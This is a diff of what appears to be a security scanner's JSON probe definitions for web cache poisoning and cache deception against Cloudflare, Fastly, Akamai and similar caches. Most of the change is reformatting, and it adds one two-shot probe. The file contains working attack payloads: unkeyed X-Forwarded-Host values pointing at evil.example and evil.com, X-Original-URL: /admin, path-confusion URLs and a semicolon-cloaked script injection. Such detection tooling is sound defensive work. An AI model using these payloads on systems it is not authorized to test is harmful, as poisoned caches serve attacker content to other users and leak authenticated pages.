@@ -3,15 +3,45 @@
   "contexts": {
     "unkeyed_headers": {
       "description": "Web cache poisoning via unkeyed headers — inject values into cached responses by abusing headers the cache ignores when computing the cache key",
-      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx"],
-      "param_match": ["cb", "cachebuster", "utm_source", "utm_content", "v", "ver", "cache"],
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "CloudFront",
+        "Nginx"
+      ],
+      "param_match": [
+        "cb",
+        "cachebuster",
+        "utm_source",
+        "utm_content",
+        "v",
+        "ver",
+        "cache"
+      ],
       "probes": [
         {
           "payload": "X-Forwarded-Host: swktest-{{marker}}.evil.example",
           "description": "X-Forwarded-Host injection — if swktest-<marker>.evil.example appears in a script src, link href, or redirect in response body AND cache headers present, the header is unkeyed and poisons cached content",
           "matchers": [
-            {"type": "word", "words": ["swktest-"], "condition": "or"},
-            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "swktest-"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header",
+              "headers": [
+                "X-Cache",
+                "Age",
+                "CF-Cache-Status",
+                "X-Varnish"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -21,8 +51,20 @@
           "payload": "X-Forwarded-Scheme: http",
           "description": "X-Forwarded-Scheme downgrade — forces 301/302 redirect to HTTP, poisoning cache with redirect loop or protocol downgrade",
           "matchers": [
-            {"type": "status", "status": [301, 302]},
-            {"type": "header", "headers": ["Location"], "condition": "or"}
+            {
+              "type": "status",
+              "status": [
+                301,
+                302
+              ]
+            },
+            {
+              "type": "header",
+              "headers": [
+                "Location"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -32,7 +74,10 @@
           "payload": "X-Original-URL: /admin",
           "description": "X-Original-URL override — backend processes /admin instead of requested path; response length diff indicates path override worked",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 65,
@@ -42,15 +87,42 @@
     },
     "cache_deception": {
       "description": "Web cache deception — trick the cache into storing authenticated responses by appending static file extensions to dynamic URLs",
-      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx"],
-      "param_match": ["cb", "cachebuster", "utm_source", "utm_content", "v", "ver", "cache"],
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "CloudFront",
+        "Nginx"
+      ],
+      "param_match": [
+        "cb",
+        "cachebuster",
+        "utm_source",
+        "utm_content",
+        "v",
+        "ver",
+        "cache"
+      ],
       "probes": [
         {
           "payload": "/TARGET_PATH/nonexistent.css",
           "description": "Path confusion with .css extension — cache stores authenticated page content as static CSS resource, leaking sensitive data to unauthenticated users",
           "matchers": [
-            {"type": "length_diff", "min_diff": 50},
-            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "header",
+              "headers": [
+                "X-Cache",
+                "Age",
+                "CF-Cache-Status",
+                "X-Varnish"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 70,
@@ -60,8 +132,20 @@
           "payload": "/TARGET_PATH;x=1.js",
           "description": "Semicolon path parameter with .js extension — backend ignores semicolon suffix, cache keys on full path including .js and stores authenticated content",
           "matchers": [
-            {"type": "length_diff", "min_diff": 50},
-            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "header",
+              "headers": [
+                "X-Cache",
+                "Age",
+                "CF-Cache-Status",
+                "X-Varnish"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 65,
@@ -71,8 +155,20 @@
           "payload": "/TARGET_PATH%2f.css",
           "description": "URL-encoded slash with .css extension — path normalization discrepancy between cache and backend causes authenticated content to be cached as static file",
           "matchers": [
-            {"type": "length_diff", "min_diff": 50},
-            {"type": "header", "headers": ["X-Cache", "Age", "CF-Cache-Status", "X-Varnish"], "condition": "or"}
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "header",
+              "headers": [
+                "X-Cache",
+                "Age",
+                "CF-Cache-Status",
+                "X-Varnish"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 65,
@@ -82,14 +178,22 @@
     },
     "cloudflare_cache_bypass": {
       "description": "Cloudflare-specific cache key normalization quirks. Cloudflare treats some query-string variants as identical cache keys, allowing variant-based poisoning. Detection: response carries CF-Ray, CF-Cache-Status, or Server: cloudflare.",
-      "tech_match": ["Cloudflare", "cf-ray", "CF-Cache-Status"],
+      "tech_match": [
+        "Cloudflare",
+        "cf-ray",
+        "CF-Cache-Status"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "?{{baseline_q}}&",
           "description": "Trailing-empty-param trick — ?x=1 and ?x=1& may share cache key. Test by polluting one variant and checking the other.",
           "matchers": [
-            {"type": "header", "name": "CF-Cache-Status", "contains": "HIT"}
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": "HIT"
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -99,7 +203,11 @@
           "payload": "?{{baseline_q}}#x",
           "description": "Fragment in query — Cloudflare strips fragments before keying but origin may receive full URL. Differential pollution possible.",
           "matchers": [
-            {"type": "header", "name": "CF-Cache-Status", "contains": "HIT"}
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": "HIT"
+            }
           ],
           "severity": "medium",
           "confidence_boost": 35,
@@ -109,26 +217,48 @@
           "payload": "{{baseline}}",
           "description": "X-HTTP-Method-Override on cached path — Cloudflare keys on method but origin honors override. Cache HIT for the override response = poisoning.",
           "matchers": [
-            {"type": "header", "name": "CF-Cache-Status", "contains": "HIT"},
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": "HIT"
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
-          "variables": {"extra_headers": {"X-HTTP-Method-Override": "PUT"}}
+          "variables": {
+            "extra_headers": {
+              "X-HTTP-Method-Override": "PUT"
+            }
+          }
         }
       ]
     },
     "fastly_normalization": {
       "description": "Fastly-specific cache normalization. Fastly canonicalizes %2f / / and some Unicode variants before keying, leading to differential responses between cache and origin.",
-      "tech_match": ["Fastly", "x-served-by", "x-cache"],
+      "tech_match": [
+        "Fastly",
+        "x-served-by",
+        "x-cache"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{baseline_path}}%2fpoison",
           "description": "%2f normalization — Fastly may collapse %2f to / for keying while origin treats them differently.",
           "matchers": [
-            {"type": "header", "name": "X-Cache", "contains": "HIT"},
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": "HIT"
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -138,8 +268,15 @@
           "payload": "{{baseline_path}}/../{{baseline_path}}",
           "description": "Path traversal normalized — Fastly may resolve ../ before keying. Origin path differs from cache key.",
           "matchers": [
-            {"type": "header", "name": "X-Served-By", "contains": "cache"},
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "header",
+              "name": "X-Served-By",
+              "contains": "cache"
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 45,
@@ -149,15 +286,26 @@
     },
     "akamai_param_order": {
       "description": "Akamai Edge — query-string parameter order may not be normalized in cache key. ?a=1&b=2 and ?b=2&a=1 can be distinct keys, allowing per-order poisoning.",
-      "tech_match": ["Akamai", "x-akamai-staging", "x-akamai"],
+      "tech_match": [
+        "Akamai",
+        "x-akamai-staging",
+        "x-akamai"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{baseline_q_reversed}}",
           "description": "Reverse query-parameter order — if Akamai keys on raw query string and origin accepts both orders, two distinct cached versions exist. Poison the less-common one and survive cache invalidation longer.",
           "matchers": [
-            {"type": "header", "name": "X-Akamai-Staging", "contains": ""},
-            {"type": "length_diff", "min_diff": 50}
+            {
+              "type": "header",
+              "name": "X-Akamai-Staging",
+              "contains": ""
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
           ],
           "severity": "medium",
           "confidence_boost": 35,
@@ -167,7 +315,11 @@
           "payload": "?{{baseline_q}}&Pragma=akamai-x-cache-on,akamai-x-get-cache-key",
           "description": "Akamai Pragma debug — some Akamai configs leak cache key and origin URL via X-Cache-Key / X-True-Cache-Key headers. Useful intel for crafting collisions.",
           "matchers": [
-            {"type": "header", "name": "X-Cache-Key", "contains": ""}
+            {
+              "type": "header",
+              "name": "X-Cache-Key",
+              "contains": ""
+            }
           ],
           "severity": "medium",
           "confidence_boost": 40,
@@ -184,11 +336,19 @@
           "payload": "{{baseline}}",
           "description": "HEAD then GET — issue HEAD to populate cache, then GET. Compare bodies. If GET serves a HEAD-style empty body or different metadata, cache layer is conflating methods.",
           "matchers": [
-            {"type": "length_delta", "min_delta": 100}
+            {
+              "type": "length_delta",
+              "min_delta": 100
+            }
           ],
           "severity": "medium",
           "confidence_boost": 30,
-          "variables": {"method_chain": ["HEAD", "GET"]}
+          "variables": {
+            "method_chain": [
+              "HEAD",
+              "GET"
+            ]
+          }
         }
       ]
     },
@@ -201,8 +361,15 @@
           "payload": "{{baseline}}",
           "description": "Send GET with Accept-Encoding: identity and a poison value, then GET with Accept-Encoding: gzip. If both responses match (cache ignored Vary), encoding confusion is possible.",
           "matchers": [
-            {"type": "header", "name": "Vary", "contains": "Accept-Encoding"},
-            {"type": "length_delta", "min_delta": 200}
+            {
+              "type": "header",
+              "name": "Vary",
+              "contains": "Accept-Encoding"
+            },
+            {
+              "type": "length_delta",
+              "min_delta": 200
+            }
           ],
           "severity": "medium",
           "confidence_boost": 30,
@@ -212,14 +379,35 @@
     },
     "parameter_cloaking": {
       "description": "Cache key manipulation via parameter cloaking — exploit cache parameter parsing discrepancies to inject unkeyed parameters into cached responses",
-      "tech_match": ["Varnish", "Cloudflare", "Akamai", "Fastly", "CloudFront", "Nginx"],
-      "param_match": ["cb", "cachebuster", "utm_source", "utm_content", "v", "ver", "cache"],
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "CloudFront",
+        "Nginx"
+      ],
+      "param_match": [
+        "cb",
+        "cachebuster",
+        "utm_source",
+        "utm_content",
+        "v",
+        "ver",
+        "cache"
+      ],
       "probes": [
         {
           "payload": "?utm_content=x;evil=<script>alert(1)</script>",
           "description": "Semicolon parameter cloaking — cache excludes utm_content from key but backend parses semicolon as parameter delimiter, reflecting the evil parameter value in cached response",
           "matchers": [
-            {"type": "word", "words": ["<script>alert(1)</script>"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "<script>alert(1)</script>"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 75,
@@ -229,11 +417,37 @@
           "payload": "GET_WITH_BODY",
           "description": "Fat GET request — send GET with body parameters; cache ignores request body when computing key but backend processes body params, poisoning cached response with attacker-controlled values",
           "matchers": [
-            {"type": "length_diff", "min_diff": 50}
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
           "variables": {}
+        }
+      ]
+    },
+    "two_shot_persistence_dsl": {
+      "description": "Two-shot cache-poisoning DSL — randstr payload in request 1, baseline in request 2. If randstr appears in response 2, the cache is poisoned.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "X-Forwarded-Host: praetor-canary-{{randstr}}.evil.com",
+          "description": "Two-shot probe — set canary in shot 1 via unkeyed header, observe in shot 2 baseline",
+          "matchers": [
+            {
+              "type": "reflection",
+              "marker": "praetor-canary-"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {
+            "two_shot": true,
+            "manual_chain": true
+          }
         }
       ]
     }
